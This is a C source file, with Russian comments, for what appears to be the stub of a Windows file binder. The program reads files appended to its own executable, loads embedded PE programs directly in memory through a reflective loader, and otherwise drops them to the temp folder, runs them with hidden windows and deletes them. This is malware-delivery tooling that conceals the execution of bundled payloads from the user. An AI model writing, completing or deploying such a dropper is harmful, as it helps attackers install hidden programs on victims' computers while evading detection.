
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "pe_loader.h"

// --- Логирование ---
void log_message(const char* msg) {
    char temp_dir[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_dir);
    char log_path[MAX_PATH];
    sprintf(log_path, "%s\\binder_log.txt", temp_dir);
    FILE* f = fopen(log_path, "a");
    if (f) {
        fprintf(f, "%s\n", msg);
        fclose(f);
    }
}

// Структура для информации о файле
typedef struct {
    char name[256];
    DWORD size;
    int order;
    BOOL hidden;
} FileInfo;

FileInfo* files = NULL;
int files_count = 0;
BYTE* data_start = NULL;
BYTE* all_data = NULL;

BOOL load_embedded_data() {
    log_message("[STUB] load_embedded_data: start");
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    HANDLE hFile = CreateFileA(exe_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { 
        log_message("[STUB] ERROR: cannot open exe"); 
        return FALSE; 
    }
    
    DWORD file_size = GetFileSize(hFile, NULL);
    if (file_size < 4096) { 
        CloseHandle(hFile); 
        log_message("[STUB] ERROR: file too small"); 
        return FALSE; 
    }
    
    DWORD read_size = (file_size > 1048576) ? 1048576 : file_size; // 1 МБ
    SetFilePointer(hFile, file_size - read_size, NULL, FILE_BEGIN);
    BYTE* buffer = (BYTE*)malloc(read_size);
    if (!buffer) {
        CloseHandle(hFile);
        log_message("[STUB] ERROR: malloc failed");
        return FALSE;
    }
    
    DWORD bytes_read = 0;
    if (!ReadFile(hFile, buffer, read_size, &bytes_read, NULL) || bytes_read != read_size) {
        CloseHandle(hFile);
        free(buffer);
        log_message("[STUB] ERROR: read failed");
        return FALSE;
    }
    CloseHandle(hFile);
    
    // Ищем сигнатуру с конца
    int sig_offset = -1;
    for (int i = read_size - 8; i >= 0; i--) {
        if (*(DWORD*)(buffer + i) == 0x12345678) {
            sig_offset = i;
            break;
        }
    }
    if (sig_offset == -1) { 
        log_message("[STUB] ERROR: signature not found"); 
        free(buffer); 
        return FALSE; 
    }
    data_start = buffer + sig_offset;
    
    // Читаем количество файлов
    files_count = *(DWORD*)(data_start + 4);
    if (files_count <= 0 || files_count > 100) { 
        log_message("[STUB] ERROR: bad files_count"); 
        free(buffer); 
        return FALSE; 
    }
    
    files = (FileInfo*)malloc(files_count * sizeof(FileInfo));
    if (!files) { 
        log_message("[STUB] ERROR: malloc files"); 
        free(buffer); 
        return FALSE; 
    }
    
    // Читаем информацию о файлах
    BYTE* ptr = data_start + 8;
    for (int i = 0; i < files_count; i++) {
        if (ptr >= buffer + read_size - 4) {
            log_message("[STUB] ERROR: buffer overflow");
            free(buffer);
            return FALSE;
        }
        
        DWORD name_len = *(DWORD*)ptr;
        ptr += 4;
        if (name_len > 255) { 
            log_message("[STUB] ERROR: name_len > 255"); 
            free(buffer); 
            return FALSE; 
        }
        
        if (ptr + name_len + 12 >= buffer + read_size) {
            log_message("[STUB] ERROR: buffer overflow 2");
            free(buffer);
            return FALSE;
        }
        
        memcpy(files[i].name, ptr, name_len);
        files[i].name[name_len] = 0;
        ptr += name_len;
        files[i].size = *(DWORD*)ptr;
        ptr += 4;
        files[i].order = *(DWORD*)ptr;
        ptr += 4;
        files[i].hidden = *(DWORD*)ptr;
        ptr += 4;
        
        // Пропускаем данные файла
        if (ptr + files[i].size > buffer + read_size) {
            log_message("[STUB] ERROR: file data overflow");
            free(buffer);
            return FALSE;
        }
        ptr += files[i].size;
    }
    all_data = buffer;
    log_message("[STUB] load_embedded_data: success");
    return TRUE;
}

BOOL execute_from_memory(int file_index) {
    if (file_index < 0 || file_index >= files_count || !files) return FALSE;
    
    // Find file data
    BYTE* ptr = data_start + 8;
    for (int i = 0; i < file_index; i++) {
        DWORD name_len = *(DWORD*)ptr;
        ptr += 4 + name_len + 12;
        ptr += files[i].size;
    }
    
    // Skip file header
    DWORD name_len = *(DWORD*)ptr;
    ptr += 4 + name_len + 12;
    
    // Check if it's a PE file
    if (files[file_index].size < 64 || *(WORD*)ptr != 0x5A4D) {
        log_message("[STUB] Not a PE file");
        return FALSE;
    }
    
    // Initialize PE context
    PE_CONTEXT ctx = {0};
    if (!load_pe_from_memory(ptr, files[file_index].size, &ctx)) {
        log_message("[STUB] Failed to load PE");
        log_message(ctx.error_msg);
        return FALSE;
    }
    
    // Create main thread
    HANDLE hThread = NULL;
    if (!create_main_thread(&ctx, &hThread)) {
        log_message("[STUB] Failed to create thread");
        log_message(ctx.error_msg);
        unload_pe(&ctx);
        return FALSE;
    }
    
    // Resume thread
    ResumeThread(hThread);
    
    if (1 == 0) { // sequential
        WaitForSingleObject(hThread, INFINITE);
        unload_pe(&ctx);
    }
    
    CloseHandle(hThread);
    return TRUE;
}

void execute_file(const char* filename, BOOL hidden) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    if (hidden) {
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
    }
    
    CreateProcessA(NULL, (LPSTR)filename, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    
    if (1 == 0) { // sequential
        WaitForSingleObject(pi.hProcess, INFINITE);
    }
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int main() {
    MessageBoxA(NULL, "STUB MAIN STARTED", "DEBUG", MB_OK);
    log_message("[STUB] main started");
    // Загружаем встроенные данные
    if (!load_embedded_data()) {
        log_message("[STUB] main: load_embedded_data failed");
        MessageBoxA(NULL, "Ошибка загрузки данных", "Binder Error", MB_OK | MB_ICONERROR);
        return 1;
    }
    
    // Сортировка по порядку выполнения
    for (int i = 0; i < files_count - 1; i++) {
        for (int j = i + 1; j < files_count; j++) {
            if (files[i].order > files[j].order) {
                FileInfo temp = files[i];
                files[i] = files[j];
                files[j] = temp;
            }
        }
    }
    log_message("[STUB] main: files sorted");
    // Выполнение файлов в памяти (для PE) или через временные файлы
    for (int i = 0; i < files_count; i++) {
        char logbuf[256];
        sprintf(logbuf, "[STUB] main: executing file %d: %s", i, files[i].name);
        log_message(logbuf);
        // Пытаемся выполнить в памяти
        if (!execute_from_memory(i)) {
            log_message("[STUB] main: execute_from_memory failed, extracting to temp");
            // Если не получилось, создаем временный файл
            char temp_dir[MAX_PATH];
            GetTempPathA(MAX_PATH, temp_dir);
            char full_path[MAX_PATH];
            sprintf(full_path, "%s\\%s", temp_dir, files[i].name);
            
            // Извлекаем во временный файл
            BYTE* ptr = data_start + 8;
            for (int j = 0; j < i; j++) {
                DWORD name_len = *(DWORD*)ptr;
                ptr += 4 + name_len + 12;
                ptr += files[j].size;
            }
            
            DWORD name_len = *(DWORD*)ptr;
            ptr += 4 + name_len + 12;
            
            HANDLE hFile = CreateFileA(full_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD written;
                WriteFile(hFile, ptr, files[i].size, &written, NULL);
                CloseHandle(hFile);
                
                if (written == files[i].size) {
                    log_message("[STUB] main: file written, executing");
                    execute_file(full_path, files[i].hidden);
                    // Удаляем временный файл после запуска
                    DeleteFileA(full_path);
                } else {
                    log_message("[STUB] main: file write size mismatch");
                }
            } else {
                log_message("[STUB] main: failed to create temp file");
            }
        } else {
            log_message("[STUB] main: executed from memory");
        }
    }
    
    // Очистка
    if (files) free(files);
    if (all_data) free(all_data);
    log_message("[STUB] main: finished successfully");
    return 0;
}
